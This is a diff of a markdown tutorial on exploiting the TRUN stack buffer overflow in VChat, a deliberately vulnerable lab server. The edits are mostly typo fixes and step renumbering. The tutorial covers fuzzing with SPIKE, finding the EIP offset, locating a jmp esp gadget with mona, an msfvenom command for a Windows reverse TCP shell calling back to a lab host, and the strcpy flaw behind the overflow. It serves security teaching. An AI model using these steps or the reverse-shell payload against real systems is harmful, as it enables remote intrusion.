@@ -14,9 +14,9 @@ We will be exploiting a customized and modified Vulnerable By Design (VbD) serve
 The following sections cover the process that should (Or may) be followed when preforming this exploitation on the VChat application. It should be noted, that the [**Dynamic Analysis**](#dynamic-analysis) section makes certain assumption primarily that we have access to the binary that may not be realistic in cases where you exploit remote servers; however the enumeration and exploitation of generic Windows, and Linux servers to get the binary from a remote server falls outside of the scope of this document.
 
 ### PreExploitation
-1. **Windows**: Setup Vchat
-   1. Compile VChat and it's dependencies if they has not already been compiled. This is done with mingw 
-      1. Create the essfunc object File 
+1. **Windows**: Setup Vchat.
+   1. Compile VChat and it's dependencies if they has not already been compiled. This is done with mingw.
+      1. Create the essfunc object File. 
 		```powershell
 		# Compile Essfunc Object file 
 		$ gcc.exe -c essfunc.c
@@ -30,17 +30,17 @@ The following sections cover the process that should (Or may) be followed when p
          * ```-Wl,--out-implib=libessfunc.a```: We tell the linker to generate generate a import library "libessfunc".a" [2].
          * ```-Wl,--image-base=0x62500000```: We specify the [Base Address](https://learn.microsoft.com/en-us/cpp/build/reference/base-base-address?view=msvc-170) as ```0x62500000``` [3].
          * ```essfunc.o```: We build the DLL based off of the object file "essfunc.o"
-      3. Compile the VChat application 
+      3. Compile the VChat application. 
 		```powershell
 		# Compile and Link VChat
 		$ gcc.exe vchat.c -o vchat.exe -lws2_32 ./libessfunc.a
 		```
-         * ```vchat.c```: The source file is "vchat.c"
-         * ```-o vchat.exe```: The output file will be the executable "vchat.exe"
-         * ```-lws2_32 ./libessfunc.a```: Link the executable against the import library "libessfunc.a", enabling it to use the DLL "essfunc.dll"
-   2. Launch the VChat application 
-		* Click on the Icon in File Explorer when it is in the same directory as the essfunc dll
-2. **Linux**: Run NMap
+         * ```vchat.c```: The source file is "vchat.c".
+         * ```-o vchat.exe```: The output file will be the executable "vchat.exe".
+         * ```-lws2_32 ./libessfunc.a```: Link the executable against the import library "libessfunc.a", enabling it to use the DLL "essfunc.dll".
+   2. Launch the VChat application. 
+		* Click on the Icon in File Explorer when it is in the same directory as the essfunc dll.
+2. **Linux**: Run NMap.
 	```sh
 	# Replace the <IP> with the IP of the machine.
 	$ nmap -A <IP>
@@ -51,7 +51,7 @@ The following sections cover the process that should (Or may) be followed when p
 
 		![Alt text](Images/Nmap.png)
 
-3. **Linux**: As we can see the port ```9999``` is open, we can try accessing it using **Telnet** to send unencrypted communications
+3. **Linux**: As we can see the port ```9999``` is open, we can try accessing it using **Telnet** to send unencrypted communications.
 	```
 	$ telnet <VChat-IP> <Port>
 
@@ -59,8 +59,8 @@ The following sections cover the process that should (Or may) be followed when p
 	# telnet 127.0.0.1 9999
 	```
    * Once you have connected, try running the ```HELP``` command, this will give us some information regarding the available commands the server processes and the arguments they take. This provides us a starting point for our [*fuzzing*](https://owasp.org/www-community/Fuzzing) work.
-   * Exit with ```CTL+]```
-   * An example is shown below
+   * Exit with ```CTL+]```.
+   * An example is shown below:
 
 		![Alt text](Images/Telnet.png)
 
@@ -77,7 +77,7 @@ This phase of exploitation is where we launch the target application's binary or
 
 	<img src="Images/I1.png" width=800> 
 
-    * Note that you may need to launch it as the *Administrator* this is done by right clicking the icon found in the windows search bar or on the desktop as shown below:
+    * Note that you may need to launch it as the *Administrator* this is done by right clicking the icon found in the Windows search bar or on the desktop as shown below:
 			
 	<img src="Images/I1b.png" width = 200>
 
@@ -109,7 +109,7 @@ This phase of exploitation is where we launch the target application's binary or
 
 
 #### Fuzzing
-SPIKE is a C based fuzzing tool that is commonly used by professionals, it is available in [kali linux](https://www.kali.org/tools/spike/) and other [pen-testing platforms](https://www.blackarch.org/fuzzer.html) and repositories. We should note that the original reference page appears to have been taken over by a slot machine site at the time of this writing, so you should refer to the [original writeup](http://thegreycorner.com/2010/12/25/introduction-to-fuzzing-using-spike-to.html) of the SPIKE tool by vulnserver's author [Stephen Bradshaw](http://thegreycorner.com/) in addition to [other resources](https://samsclass.info/127/proj/p18-spike.htm) for guidance. The source code is still available on [GitHub](https://github.com/guilhermeferreira/spikepp/) and still maintained on [GitLab](https://gitlab.com/kalilinux/packages/spike).
+SPIKE is a C based fuzzing tool that is commonly used by professionals, it is available in [kali linux](https://www.kali.org/tools/spike/) and other [pen-testing platforms](https://www.blackarch.org/fuzzer.html) repositories. We should note that the original reference page appears to have been taken over by a slot machine site at the time of this writing, so you should refer to the [original writeup](http://thegreycorner.com/2010/12/25/introduction-to-fuzzing-using-spike-to.html) of the SPIKE tool by vulnserver's author [Stephen Bradshaw](http://thegreycorner.com/) in addition to [other resources](https://samsclass.info/127/proj/p18-spike.htm) for guidance. The source code is still available on [GitHub](https://github.com/guilhermeferreira/spikepp/) and still maintained on [GitLab](https://gitlab.com/kalilinux/packages/spike).
 
 1. Open a terminal on the **Kali Linux Machine**
 2. Create a file ```TURN.spk``` with your favorite text editor. We will be using a SPIKE script and interpreter rather than writing our own C based fuzzer. We will be using the [mousepad](https://github.com/codebrainz/mousepad) text editor in this walkthrough though any editor may be used.
@@ -118,6 +118,7 @@ SPIKE is a C based fuzzing tool that is commonly used by professionals, it is av
 	```
 	* If you do not have a GUI environment, an editor like [nano](https://www.nano-editor.org/), [vim](https://www.vim.org/) or [emacs](https://www.gnu.org/software/emacs/) could be used. 
 3. Define the FUZZER's parameters, we are going to be using [SPIKE](https://www.kali.org/tools/spike/) with the ```generic_send_tcp``` interpreter for TCP based fuzzing.  
+		
 	```
 	s_readline();
 	s_string("TRUN ");
@@ -126,7 +127,6 @@ SPIKE is a C based fuzzing tool that is commonly used by professionals, it is av
     * ```s_readline();```: Return the line from the server.
     * ```s_string("TRUN ");```: Specifies that we start each message with the *String* **TURN**.
     * ```s_string_variable("*");```: Specifies a String that we will mutate over, we can set it to * to say "any" as we do in this case.
-
 4. Use the Spike Fuzzer as shown below	
 	```bash
 	$ generic_send_tcp <VChat-IP> <Port> <SPIKE-Script> <SKIPVAR> <SKIPSTR>
@@ -143,13 +143,13 @@ SPIKE is a C based fuzzing tool that is commonly used by professionals, it is av
 
 	<img src="Images/I4.png" width=600>
 
-	* Notice that the VChat appears to have crashed after our second message! We can see that the SPIKE script continues to run for ~190 more iterations before it fails to connect to the VChat's TCP socket, however this is long after the server started to fail connections.
+	* Notice that VChat appears to have crashed after our second message! We can see that the SPIKE script continues to run for ~190 more iterations before it fails to connect to the VChat's TCP socket, however this is long after the server started to fail connections.
 6. We can also look at the comparison of the Register values before and after the fuzzing in Immunity Debugger to confirm a crash occurred. 
-	* Before 
+	* Before:
 
 		<img src="Images/I7.png" width=600>
 
-	* After
+	* After:
 
 		<img src="Images/I8.png" width=600>
 
@@ -167,16 +167,12 @@ SPIKE is a C based fuzzing tool that is commonly used by professionals, it is av
 	```bash
 	$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5000
 	```
-	* This will allow us to inject  and overwrite a new return address at the location out program reads the original return address from.
+	* This will allow us to inject and overwrite a new return address at the location our program reads the original return address from.
 2. Modify your exploit code to reflect the [exploit1.py](./SourceCode/exploit1.py) script and run it to inject a cyclic pattern into the Vulnserver program's stack and observe the EIP register. 
-	* This will allow us to inject  and overwrite a new return address at the location out program reads the original return address from.
-3. Modify your exploit code to reflect the [exploit1.py](./SourceCode/exploit1.py) script and run it to inject a cyclic pattern into the Vulnserver program's stack and observe the EIP register. 
 
 	<img src="Images/I9.png" width=600>
 
-4. Notice that the EIP register reads `386F4337` in this case, we can use the [pattern_offset.rb](https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/pattern_offset.rb) script to determine the return address's offset based on our search string's position in the pattern. 
-	```bash
-5. Notice that the EIP register reads `386F4337` in this case, we can use the [pattern_offset.rb](https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/pattern_offset.rb) script to determine the return address's offset based on our search string's position in the pattern. 
+3. Notice that the EIP register reads `386F4337` in this case, we can use the [pattern_offset.rb](https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/pattern_offset.rb) script to determine the return address's offset based on our search string's position in the pattern we sent to VChat. 
 	```bash
 	$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 386F4337
 	```
@@ -184,24 +180,24 @@ SPIKE is a C based fuzzing tool that is commonly used by professionals, it is av
 
 	<img src="Images/I10.png" width=600>
 
-6. Now modify the exploit program to reflect the code in the [exploit2.py](./SourceCode/exploit2.py) script and run the exploit against VChat.
+4. Now modify the exploit program to reflect the code in the [exploit2.py](./SourceCode/exploit2.py) script and run the exploit against VChat.
    * We do this to validate that we have the correct offset for the return address! 
 
 		<img src="Images/I11.png" width=600>
 
 		* See that the EIP is a series of the value `0x42` this is a series of Bs. This tells us that we can write an address to that location in order to change the control flow of the target program.
 		* *Note:* It took a few runs for this to work and update on Immunity debugger within the VirtualBox VM.
-7. Use the [mona.py](https://github.com/corelan/mona) python program within Immunity Debugger to determine useful information about our target process. While the *cyclic pattern* from [exploit1.py](./SourceCode/exploit1.py) is in memory we can run the command ```!mona findmsp``` in the command line at the bottom of the Immunity Debugger GUI. **Note:** We must have sent the cyclic pattern and it must be present in the stack frame at the time we run this command!
+5. Use the [mona.py](https://github.com/corelan/mona) python program within Immunity Debugger to determine useful information about our target process. While the *cyclic pattern* from [exploit1.py](./SourceCode/exploit1.py) is in memory we can run the command ```!mona findmsp``` in the command line at the bottom of the Immunity Debugger GUI. **Note:** We must have sent the cyclic pattern and it must be present in the stack frame at the time we run this command!
 
 	<img src="Images/I12.png" width=600>
 
       * We can see that the offset (Discovered with [pattern_offset.rb](https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/pattern_offset.rb) earlier) is at the byte offset of `2003`, the ESP has `984` bytes after jumping to the address in the ESP register, and the EBP is at the byte offset `1999`.
       * The most important thing we learn is that we have `984` bytes to work with!  
-8. Open the `Executable Modules` window from the **views** tab in Immunity Debugger. This allows us to see the memory offsets of each dependency VChat uses. This will help inform us as to which `jmp esp` instruction we should pick, since we want to avoid any *Windows dynamic libraries* since their base addresses may vary between executions and Windows systems. 
+6. Open the `Executable Modules` window from the **views** tab in Immunity Debugger. This allows us to see the memory offsets of each dependency VChat uses. This will help inform us as to which `jmp esp` instruction we should pick, since we want to avoid any *Windows dynamic libraries* since their base addresses may vary between executions and Windows systems. 
 
 	<img src="Images/I13.png" width=600>
 
-9. Use the command `!mona jmp -r esp -cp nonull -o` in the Immunity Debugger's GUI command line to find some `jmp esp` instructions.
+7. Use the command `!mona jmp -r esp -cp nonull -o` in the Immunity Debugger's GUI command line to find some `jmp esp` instructions.
 
 	<img src="Images/I14.png" width=600>
 
@@ -213,24 +209,25 @@ SPIKE is a C based fuzzing tool that is commonly used by professionals, it is av
 	<img src="Images/I15.png" width=600>
 
       * We can see there are nine possible `jmp esp` instructions in the *essfunc* dll that we can use, any should work. We will use the last one `0x6250151e`
-10. Modify your exploit program to reflect the [exploit3.py](./SourceCode/exploit3.py) script, we use this to verify that the `jmp esp` address we inject works.
+8. Modify your exploit program to reflect the [exploit3.py](./SourceCode/exploit3.py) script, we use this to verify that the `jmp esp` address we inject works.
+   1. Click on the black button highlighted below, and enter in the address we decided in the previous step.
 
 		<img src="Images/I16.png" width=600>
 
-   1. Set a breakpoint at the desired address (Right click).
+   2. Set a breakpoint at the desired address (Right click).
 
 		<img src="Images/I17.png" width=600>
 
-   2. Run the [exploit3.py](./SourceCode/exploit3.py) program till a overflow occurs (See EIP/ESP and stack changes and the message at the bottom of the screen).
+   3. Run the [exploit3.py](./SourceCode/exploit3.py) program till an overflow occurs (See EIP/ESP and stack changes and the message at the bottom of the screen).
 
 		<img src="Images/I18.png" width=600>
 
          * Notice that the EIP now points to an essfunc.dll address!
-	3. Once the overflow occurs click the *step into* button highlighted below.
+	4. Once the overflow occurs click the *step into* button highlighted below.
 
 		<img src="Images/I19.png" width=600>
 
-	4. Notice that we jump to the stack we just overflowed!
+	5. Notice that we jump to the stack we just overflowed!
 
 		<img src="Images/I20.png" width=600>
 
@@ -244,7 +241,7 @@ Up until this point in time  we have been performing [Denial of Service](https:/
 	$ msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.7 LPORT=8080 EXITFUNC=thread -f python -v SHELL -b '\x00x\0a\x0d'
 	```
 	* `-p `: Payload we are generating shellcode for.
-    	* `windows/shell_reverse_tcp`: Reverse TCP payload for windows
+    	* `windows/shell_reverse_tcp`: Reverse TCP payload for Windows
     	* `LHOST=10.0.2.7`: The remote listening host's IP, in this case our Kali machine's IP 10.0.2.7
     	* `LPORT=8080`: The port on the remote listening host's traffic should be directed to in this case port 8080
     	* `EXITFUNC=thread`: Create a thread to run the payload
@@ -288,7 +285,6 @@ Up until this point in time  we have been performing [Denial of Service](https:/
 ### VChat Code 
 In the function ```DWORD WINAPI ConnectionHandler(LPVOID CSocket)``` which is called for **all** connections made to  the **VChat** process. A message sent from the user (e.g. attacker) is put into a local buffer *RecvBuf*. The following code snippet from the ```ConnectionHandler``` function handles the **TRUN** command. This copies 3000 bytes from the *RecvBuf* into another buffer that has been declared *TurnBuf* if the command message contains a period. This new buffer *TurnBuf* is then passed to the function ```void Function3(char* Input)```. 
 
-
 <!-- Below is a code snippet from the function ```DWORD WINAPI ConnectionHandler(LPVOID CSocket)``` in the VChat source code.  -->
 	```c
 	// Allocate TrunBuf on the heap
@@ -314,6 +310,7 @@ In the function ```DWORD WINAPI ConnectionHandler(LPVOID CSocket)``` which is ca
 	SendResult = send(Client, "TRUN COMPLETE\n", 14, 0);
 	```
 > This ( ```DWORD WINAPI ConnectionHandler(LPVOID CSocket)```) is not where the overflow occurs!
+
 
 In ```Function3(char* Input)```, the C [standard library function](https://man7.org/linux/man-pages/man3/strcpy.3.html) ```strcpy(char* dst, char* src)``` is used to copy the passed parameter *Input* (i.e. TurnBuf) into a local buffer Buffer2S[2000]. Unlike the C [standard library function](https://cplusplus.com/reference/cstring/strncpy/) ```strncpy(char*,char*,size_t)``` used in the ```ConnectionHandler(LPVOID CSocket)``` which copies only a specified number of characters to the destination buffer. The ```strcpy(char* dst, char* src)``` function does not preform any **bound checks** when copying data from the **source** to **destination** buffer, it will stop copying once every byte up to and including a **null terminator** (`\0`) from the **source** buffer has been copied contiguously to the **destination** buffer. This means if the **source** contains more characters than the **destination** buffer can hold, ```strcpy(char*,char*)``` will continue to copy them even past the bounds of the destination object. The location of the **destination** object being allocated on the *stack* (locally defined) or on the *heap* (dynamically defined) does affect the basic overflow concept but would modify the exploit; in this case the **destination** is created *locally* on the stack. This object being located on the stack allows us to **overflow** the bounds and **overwrite** the return address which is located on the stack. This allowing us to take control of the program. 
 
